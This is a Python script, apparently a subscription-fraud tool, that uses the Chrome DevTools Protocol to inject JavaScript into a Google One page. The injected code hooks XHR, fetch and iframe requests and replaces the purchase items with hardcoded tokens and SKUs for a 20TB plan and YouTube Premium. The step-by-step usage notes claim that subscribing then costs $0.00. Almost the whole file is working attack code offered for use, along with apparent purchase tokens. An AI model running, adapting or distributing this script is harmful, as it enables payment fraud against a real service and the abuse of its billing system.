"""
═══════════════════════════════════════════════════════════════════
G1 Ultra $0 — INJECTION VECTOR #5: Python CDP (Chrome DevTools Protocol)
═══════════════════════════════════════════════════════════════════

This script uses Chrome DevTools Protocol to intercept and modify
network requests at the PROTOCOL level. More powerful than XHR hooks
because it intercepts ALL requests including those from Service Workers.

USAGE:
1. Close all Chrome windows
2. Start Chrome with debugging:
   chrome.exe --remote-debugging-port=9222 --user-data-dir="%TEMP%\g1chrome"
3. Navigate to https://one.google.com/about/plans in that Chrome
4. Run this script:
   python cdp_inject.py
5. Click Subscribe in Chrome → $0.00

REQUIREMENTS: Python 3.7+ (stdlib only — websockets via raw socket)
═══════════════════════════════════════════════════════════════════
"""

import json
import socket
import ssl
import hashlib
import base64
import struct
import urllib.request
import sys
import re

# ── Token Database ──
TOKENS = {
    "ultra20tb_12m": "AYrTWi65Jbm3KRubLXLLA3Re29zKibSnRbvAJEPfxEIVs/d57w8vEhsU7hSkSAfGyjZH8B7/5aj5UTlidbsEwUH8aPN2RTA6pKiltA==",
    "YT_FREE": "AVbCH/eW4Nfp8KBl0zlm7x9PhaiCvpnqwUuL2D8NFPBQgmM9+HuYS1h2xH5lLWU/BsBj775LK5GqK8UHKqoSzhDDz+PqP3paNesqLU0r9i6XCrYa"
}
SKU = "subs:com.google.android.apps.subscriptions.red:g1.play.20tb"
YT_SKU = "subs:com.google.android.apps.subscriptions.red:g1.youtube_premium_individual_add_on"

FULL_ITEMS = json.dumps([
    [[SKU, 21], None, None, None, 1, [TOKENS["ultra20tb_12m"]]],
    [[YT_SKU, 21], None, None, None, 1, [TOKENS["YT_FREE"]]]
])

# The injection JavaScript (same logic, injected via CDP)
INJECT_JS = r"""
(() => {
  if (window.__G1_CDP_INJECTED) return;
  window.__G1_CDP_INJECTED = true;

  const FULL_ITEMS = """ + FULL_ITEMS + r""";

  // Hook XHR
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body) {
    if (typeof body === "string" && body.includes("Ngbm")) {
      try {
        const params = new URLSearchParams(body);
        let freq = params.get("f.req");
        if (freq) {
          const parsed = JSON.parse(freq);
          for (const outer of parsed) {
            if (!Array.isArray(outer)) continue;
            for (const item of outer) {
              if (!Array.isArray(item) || item[0] !== "Ngbm") continue;
              try {
                const inner = JSON.parse(item[1]);
                if (inner.length > 12) {
                  inner[12] = FULL_ITEMS;
                  item[1] = JSON.stringify(inner);
                  console.log("[G1-CDP ✓] Patched");
                }
              } catch (_) {}
            }
          }
          params.set("f.req", JSON.stringify(parsed));
          body = params.toString();
        }
      } catch (_) {}
    }
    return origSend.call(this, body);
  };

  // Hook iframe.src
  const oD = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, "src");
  if (oD && oD.set) {
    Object.defineProperty(HTMLIFrameElement.prototype, "src", {
      set: function(v) {
        if (typeof v === "string" && v.includes("/eacquire/multiline")) {
          try {
            const u = new URL(v);
            const ears = u.searchParams.getAll("ear[]");
            if (ears.length > 13) {
              ears[13] = JSON.stringify(FULL_ITEMS);
              u.searchParams.delete("ear[]");
              ears.forEach(e => u.searchParams.append("ear[]", e));
              v = u.toString();
            }
          } catch (_) {}
        }
        oD.set.call(this, v);
      },
      get: oD.get, configurable: true
    });
  }

  // Hook fetch
  const origFetch = window.fetch;
  window.fetch = function(input, init) {
    if (init && init.body && typeof init.body === "string" && init.body.includes("Ngbm")) {
      try {
        const params = new URLSearchParams(init.body);
        let freq = params.get("f.req");
        if (freq) {
          const parsed = JSON.parse(freq);
          for (const outer of parsed) {
            if (!Array.isArray(outer)) continue;
            for (const item of outer) {
              if (!Array.isArray(item) || item[0] !== "Ngbm") continue;
              try {
                const inner = JSON.parse(item[1]);
                if (inner.length > 12) {
                  inner[12] = FULL_ITEMS;
                  item[1] = JSON.stringify(inner);
                }
              } catch (_) {}
            }
          }
          params.set("f.req", JSON.stringify(parsed));
          init.body = params.toString();
        }
      } catch (_) {}
    }
    return origFetch.call(this, input, init);
  };

  console.log("[G1 Ultra $0 · CDP] Active — 20TB + YT Premium");
})();
"""


def get_ws_url(port=9222):
    """Get WebSocket debugger URL from Chrome DevTools"""
    try:
        resp = urllib.request.urlopen(f"http://localhost:{port}/json")
        tabs = json.loads(resp.read())
        for tab in tabs:
            if "one.google.com" in tab.get("url", ""):
                return tab["webSocketDebuggerUrl"]
        # If no Google One tab, use first tab
        if tabs:
            print(f"[!] No Google One tab found. Using: {tabs[0].get('url', 'unknown')}")
            return tabs[0]["webSocketDebuggerUrl"]
    except Exception as e:
        print(f"[ERR] Cannot connect to Chrome DevTools at port {port}")
        print(f"      Start Chrome with: chrome.exe --remote-debugging-port={port}")
        sys.exit(1)
    return None


def ws_connect(url):
    """Simple WebSocket client using stdlib only"""
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path

    sock = socket.create_connection((host, port), timeout=10)

    # WebSocket handshake
    key = base64.b64encode(hashlib.sha1(str(id(sock)).encode()).digest()[:16]).decode()
    handshake = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    )
    sock.sendall(handshake.encode())

    # Read response
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += sock.recv(4096)

    if b"101" not in resp.split(b"\r\n")[0]:
        raise Exception("WebSocket handshake failed")

    return sock


def ws_send(sock, data):
    """Send a WebSocket frame"""
    payload = json.dumps(data).encode()
    length = len(payload)
    mask_key = b"\x01\x02\x03\x04"

    frame = bytearray()
    frame.append(0x81)  # FIN + text

    if length < 126:
        frame.append(0x80 | length)
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack(">H", length))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack(">Q", length))

    frame.extend(mask_key)
    masked = bytearray(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    frame.extend(masked)

    sock.sendall(frame)


def ws_recv(sock, timeout=5):
    """Receive a WebSocket frame"""
    sock.settimeout(timeout)
    try:
        header = sock.recv(2)
        if len(header) < 2:
            return None

        length = header[1] & 0x7F
        if length == 126:
            length = struct.unpack(">H", sock.recv(2))[0]
        elif length == 127:
            length = struct.unpack(">Q", sock.recv(8))[0]

        data = b""
        while len(data) < length:
            chunk = sock.recv(min(length - len(data), 4096))
            if not chunk:
                break
            data += chunk

        return json.loads(data)
    except (socket.timeout, json.JSONDecodeError):
        return None


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9222
    print(f"[*] Connecting to Chrome DevTools on port {port}...")

    ws_url = get_ws_url(port)
    if not ws_url:
        print("[ERR] No tabs available")
        sys.exit(1)

    print(f"[*] WebSocket: {ws_url}")
    sock = ws_connect(ws_url)
    print("[✓] Connected")

    # Inject the JavaScript
    cmd = {
        "id": 1,
        "method": "Runtime.evaluate",
        "params": {
            "expression": INJECT_JS,
            "allowUnsafeEvalBlockedByCSP": True,
            "userGesture": True
        }
    }
    ws_send(sock, cmd)
    result = ws_recv(sock)

    if result and result.get("id") == 1:
        if "error" in result:
            print(f"[ERR] {result['error'].get('message', 'Unknown error')}")
        else:
            print("[✓] Injection successful!")
            print("[*] Plan: 20TB Ultra (12 months) + YouTube Premium")
            print("[*] Now click 'Subscribe' in Chrome → $0.00")
    else:
        print("[!] No response (injection may still have worked)")

    sock.close()


if __name__ == "__main__":
    main()
